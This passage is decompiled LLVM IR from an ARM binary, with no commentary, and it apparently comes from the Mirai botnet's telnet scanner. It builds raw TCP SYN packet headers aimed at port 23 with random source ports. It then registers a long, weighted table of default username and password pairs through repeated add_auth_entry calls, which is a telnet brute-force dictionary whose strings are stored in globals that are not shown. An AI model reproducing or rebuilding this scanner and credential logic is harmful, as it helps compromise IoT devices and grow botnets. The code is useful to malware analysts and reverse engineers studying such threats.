  store i32 4, i32* @r4, align 4
  store i16 1, i16* %stack_var_-52, align 2
  %v5_f9b0 = call i32 @__GI_setsockopt(i32 %v2_f98c, i32 %v0_f998, i32 3, i32 %v2_f9a0, i32 4)
  store i32 %v5_f9b0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9b4 = icmp eq i32 %v5_f9b0, 0
  store i1 %v2_f9b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f9b4, label %dec_label_pc_f9bc, label %dec_label_pc_10abc

dec_label_pc_f9bc:                                ; preds = %dec_label_pc_f96c, %dec_label_pc_f9bc
  %v0_f9bc = call i32 @rand_next()
  %v3_f9c0 = mul i32 %v0_f9bc, 65536
  store i32 %v3_f9c0, i32* %r0.global-to-local, align 4
  %v1_f9c8 = mul i32 %v0_f9bc, 256
  %v3_f9cc = and i32 %v1_f9c8, 65280
  %tmp348 = udiv i32 %v0_f9bc, 256
  %v4_f9d0 = urem i32 %tmp348, 256
  %v5_f9d0 = or i32 %v4_f9d0, %v3_f9cc
  store i32 %v5_f9d0, i32* %r3.global-to-local, align 4
  %v2_f9d4 = icmp ugt i32 %v5_f9d0, 1023
  store i1 %v2_f9d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f9d4 = icmp eq i32 %v5_f9d0, 1024
  store i1 %v7_f9d4, i1* %cpsr_z.global-to-local, align 1
  %v3_f9dc = icmp ult i32 %v5_f9d0, 1022
  br i1 %v3_f9dc, label %dec_label_pc_f9bc, label %dec_label_pc_f9e0

dec_label_pc_f9e0:                                ; preds = %dec_label_pc_f9bc
  %v5_f9d8.le = trunc i32 %v0_f9bc to i16
  store i32 ptrtoint (i8** @global_var_2466c.178 to i32), i32* %r0.global-to-local, align 4
  %v2_f9e4 = load i8, i8* bitcast (i8** @global_var_2466c.178 to i8*), align 4
  %v3_f9e4 = zext i8 %v2_f9e4 to i32
  %v1_f9e8 = and i32 %v3_f9e4, 240
  %v1_f9ec = or i32 %v1_f9e8, 5
  store i32 %v1_f9ec, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_2466c.178 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_2466e.179 to i16*), align 4
  %v0_fa0c = call i32 @rand_next()
  %v1_fa0c = trunc i32 %v0_fa0c to i16
  %v3_fa14 = load i8, i8* @global_var_2468c.182, align 1
  store i32 ptrtoint (i32* @global_var_24680.181 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_2466c.178 to i32), i32* %ip.global-to-local, align 4
  %tmp = urem i8 %v3_fa14, 16
  %v1_fa20 = zext i8 %tmp to i32
  store i32 6, i32* @r4, align 4
  %v1_fa28 = or i32 %v1_fa20, 80
  store i32 %v1_fa28, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i8 64, i8* bitcast (i32* @global_var_24674.183 to i8*), align 4
  store i16 %v1_fa0c, i16* bitcast (i32* @global_var_24670.184 to i16*), align 4
  %v1_fa38 = trunc i32 %v1_fa28 to i8
  store i8 %v1_fa38, i8* @global_var_2468c.182, align 1
  store i8 6, i8* bitcast (i32* @global_var_24675.185 to i8*), align 4
  %v4_fa40 = sext i16 %v5_f9d8.le to i32
  store i32 %v4_fa40, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_24682.186, align 2
  store i16 %v5_f9d8.le, i16* bitcast (i32* @global_var_24680.181 to i16*), align 4
  %v0_fa50 = call i32 @rand_next()
  %v1_fa50 = trunc i32 %v0_fa50 to i16
  %v3_fa58 = load i8, i8* @global_var_2468d.187, align 1
  %v4_fa58 = zext i8 %v3_fa58 to i32
  store i32 ptrtoint (i32* @global_var_24680.181 to i32), i32* %ip.global-to-local, align 4
  %v1_fa60 = or i32 %v4_fa58, 2
  store i32 %v1_fa60, i32* %r3.global-to-local, align 4
  store i16 %v1_fa50, i16* bitcast (i32* @global_var_2468e.188 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32* %r1.global-to-local, align 4
  %v1_fa6c = trunc i32 %v1_fa60 to i8
  store i8 %v1_fa6c, i8* @global_var_2468d.187, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_fa78 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_fa88 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3b4.196 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_fa98 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b3b4.196 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b3bc.198 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_faa8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b3bc.198 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_fab8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r1.global-to-local, align 4
  %v5_fac8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3c4.200 to i32), i32* %r1.global-to-local, align 4
  %v0_fad4 = load i32, i32* @r4, align 4
  store i32 %v0_fad4, i32* %r2.global-to-local, align 4
  %v4_fad8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b3c4.200 to i32), i32 %v0_fad4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b3cc.202 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_fae8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b3cc.202 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b3d4.204 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_faf8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b3d4.204 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b3dc.206 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_fb08 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b3dc.206 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3e8.208 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_fb18 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b3e8.208 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3f0.210 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_fb28 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b3f0.210 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_1b3d4.204 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b3d4.204 to i32), i32* %r1.global-to-local, align 4
  %v5_fb38 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b3d4.204 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b3d4.204 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_1b3d4.204 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_fb48 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b3d4.204 to i32), i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_1b3f8.212 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b3f8.212 to i32), i32* %r1.global-to-local, align 4
  %v5_fb58 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b3f8.212 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b3f8.212 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_1b3f8.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_fb68 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b3f8.212 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_1b3f8.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b804.214 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_fb78 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b3f8.212 to i32), i32 ptrtoint (i32* @global_var_1b804.214 to i32), i32 7)
  store i32 ptrtoint ([8 x i8]* @global_var_1b3f8.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3e8.208 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_fb88 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b3f8.212 to i32), i32 ptrtoint (i32* @global_var_1b3e8.208 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b3f8.212 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_fb98 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b3f8.212 to i32), i32 7)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b400.216 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_fba8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b400.216 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r1.global-to-local, align 4
  %v5_fbb8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b40c.218 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_fbc8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b40c.218 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b414.220 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_fbd8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b414.220 to i32), i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b414.220 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b414.220 to i32), i32* %r1.global-to-local, align 4
  %v5_fbe8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b414.220 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b414.220 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b414.220 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3e8.208 to i32), i32* %r1.global-to-local, align 4
  %v0_fbf4 = load i32, i32* @r4, align 4
  store i32 %v0_fbf4, i32* %r2.global-to-local, align 4
  %v4_fbf8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b414.220 to i32), i32 ptrtoint (i32* @global_var_1b3e8.208 to i32), i32 %v0_fbf4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b41c.222 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_fc08 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b41c.222 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b424.224 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_fc18 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b424.224 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b578.226 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_fc28 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b578.226 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b430.228 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_fc38 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b430.228 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b578.226 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_fc48 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint (i32* @global_var_1b578.226 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b43c.230 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_fc58 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b43c.230 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b400.216 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_fc68 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b400.216 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b804.214 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_fc78 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b804.214 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b444.232 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fc88 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b444.232 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_1b44c.234 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_fc98 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_1b44c.234 to i32), i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32 13)
  store i32 ptrtoint ([14 x i8]* @global_var_1b44c.234 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b45c.236 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_fca8 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_1b44c.234 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b45c.236 to i32), i32 13)
  store i32 ptrtoint ([14 x i8]* @global_var_1b44c.234 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b464.238 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_fcb8 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_1b44c.234 to i32), i32 ptrtoint ([4 x i8]* @global_var_1b464.238 to i32), i32 13)
  store i32 ptrtoint ([14 x i8]* @global_var_1b44c.234 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1b468.240 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_fcc8 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_1b44c.234 to i32), i32 ptrtoint ([7 x i8]* @global_var_1b468.240 to i32), i32 13)
  store i32 ptrtoint ([8 x i8]* @global_var_1b470.242 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b470.242 to i32), i32* %r1.global-to-local, align 4
  %v5_fcd8 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_1b470.242 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b470.242 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1b470.242 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_fce8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b8cc.194 to i32), i32 ptrtoint ([8 x i8]* @global_var_1b470.242 to i32), i32 7)
  store i32 ptrtoint ([11 x i8]* @global_var_1b478.244 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1b478.244 to i32), i32* %r1.global-to-local, align 4
  %v5_fcf8 = call i32 @add_auth_entry(i32 ptrtoint ([11 x i8]* @global_var_1b478.244 to i32), i32 ptrtoint ([11 x i8]* @global_var_1b478.244 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_1b484.246 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_fd08 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b484.246 to i32), i32 ptrtoint (i32* @global_var_1b384.190 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b484.246 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b484.246 to i32), i32* %r1.global-to-local, align 4
  %v5_fd18 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b484.246 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b484.246 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b484.246 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b40c.218 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_fd28 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b484.246 to i32), i32 ptrtoint (i32* @global_var_1b40c.218 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_1b484.246 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3e8.208 to i32), i32* %r1.global-to-local, align 4
  %v0_fd34 = load i32, i32* @r4, align 4
  store i32 %v0_fd34, i32* %r2.global-to-local, align 4
  %v4_fd38 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1b484.246 to i32), i32 ptrtoint (i32* @global_var_1b3e8.208 to i32), i32 %v0_fd34)
  store i32 ptrtoint (i32* @global_var_1b48c.248 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1b400.216 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_fd48 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b48c.248 to i32), i32 ptrtoint ([9 x i8]* @global_var_1b400.216 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_1b494.250 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b804.214 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_fd58 = call i32 @add_auth_entry(i32 ptrtoint ([14 x i8]* @global_var_1b494.250 to i32), i32 ptrtoint (i32* @global_var_1b804.214 to i32), i32 13)
  store i32 ptrtoint (i32* @global_var_1b43c.230 to i32), i32* %r0.global-to-local, align 4
  %v0_fd60 = load i32, i32* @r4, align 4
  store i32 %v0_fd60, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b43c.230 to i32), i32* %r1.global-to-local, align 4
  %v3_fd68 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b43c.230 to i32), i32 ptrtoint (i32* @global_var_1b43c.230 to i32), i32 %v0_fd60)
  store i32 ptrtoint (i32* @global_var_1b3c4.200 to i32), i32* %r0.global-to-local, align 4
  %v0_fd70 = load i32, i32* @r4, align 4
  store i32 %v0_fd70, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3c4.200 to i32), i32* %r1.global-to-local, align 4
  %v3_fd78 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_1b3c4.200 to i32), i32 ptrtoint (i32* @global_var_1b3c4.200 to i32), i32 %v0_fd70)
  store i32 ptrtoint ([5 x i8]* @global_var_1b4a4.252 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b4a4.252 to i32), i32* %r1.global-to-local, align 4
  %v5_fd88 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b4a4.252 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b4a4.252 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b4a4.252 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_fd98 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b4a4.252 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4ac.254 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v4_fda8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b4ac.254 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4b4.256 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_fdb8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b4b4.256 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b4bc.258 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_fdc8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint (i32* @global_var_1b4bc.258 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b4c4.260 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_fdd8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b4c4.260 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b4cc.262 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_fde8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_1b4cc.262 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1b4d4.264 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_fdf8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32 ptrtoint ([6 x i8]* @global_var_1b4d4.264 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_1b728.192 to i32), i32* %r0.global-to-local, align 4
